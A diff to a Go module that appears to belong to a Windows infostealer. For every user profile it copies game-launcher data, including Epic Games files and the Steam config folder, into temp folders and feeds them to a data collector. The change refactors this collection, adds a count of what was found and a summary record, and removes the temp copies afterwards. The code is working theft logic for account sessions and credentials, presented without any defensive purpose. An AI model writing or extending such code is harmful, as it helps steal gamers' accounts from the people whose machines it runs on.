@@ -11,6 +11,9 @@ import (
 )
 
 func Run(dataCollector *collector.DataCollector) {
+	totalFound := 0
+	allFound := ""
+	
 	for _, user := range hardware.GetUsers() {
 		paths := map[string]map[string]string{
 			"Epic Games": {
@@ -46,7 +49,9 @@ func Run(dataCollector *collector.DataCollector) {
 		}
 
 		tempDir := filepath.Join(os.TempDir(), fmt.Sprintf("games-%s", strings.Split(user, "\\")[2]))
+		os.MkdirAll(tempDir, os.ModePerm)
 		found := ""
+		
 		for name, path := range paths {
 			dest := filepath.Join(tempDir, strings.Split(user, "\\")[2], name)
 
@@ -70,6 +75,7 @@ func Run(dataCollector *collector.DataCollector) {
 
 				if !strings.Contains(found, name) {
 					found += fmt.Sprintf("\n✅ %s ", name)
+					totalFound++
 				}
 			}
 
@@ -80,18 +86,15 @@ func Run(dataCollector *collector.DataCollector) {
 			continue
 		}
 
-		// Add games data to collector
-		gamesInfo := map[string]interface{}{
-			"User":       strings.Split(user, "\\")[2],
-			"GamesFound": found,
-		}
-		dataCollector.AddData("games", gamesInfo)
+		allFound += found
 		dataCollector.AddDirectory("games", tempDir, fmt.Sprintf("games_%s", strings.Split(user, "\\")[2]))
 
 		os.RemoveAll(tempDir)
 	}
 
+	// Steam processing
 	tempDir := fmt.Sprintf("%s\\%s", os.TempDir(), "steam-temp")
+	os.MkdirAll(tempDir, os.ModePerm)
 	defer os.RemoveAll(tempDir)
 
 	path := "C:\\Program Files (x86)\\Steam\\config"
@@ -103,10 +106,20 @@ func Run(dataCollector *collector.DataCollector) {
 		return
 	}
 
-	// Add Steam data to collector
-	steamInfo := map[string]interface{}{
-		"Status": "Steam config found and collected",
+	allFound += "\n✅ Steam Config"
+	totalFound++
+	dataCollector.AddDirectory("games", tempDir, "steam_config")
+
+	// Add summary games data to collector
+	if totalFound > 0 {
+		gamesInfo := map[string]interface{}{
+			"TotalGamesFound": totalFound,
+			"GamesDetails":    allFound,
+		}
+		dataCollector.AddData("games", gamesInfo)
+	} else {
+		dataCollector.AddData("games", map[string]interface{}{
+			"Status": "No games data found",
+		})
 	}
-	dataCollector.AddData("steam", steamInfo)
-	dataCollector.AddDirectory("steam", tempDir, "steam_config")
 }
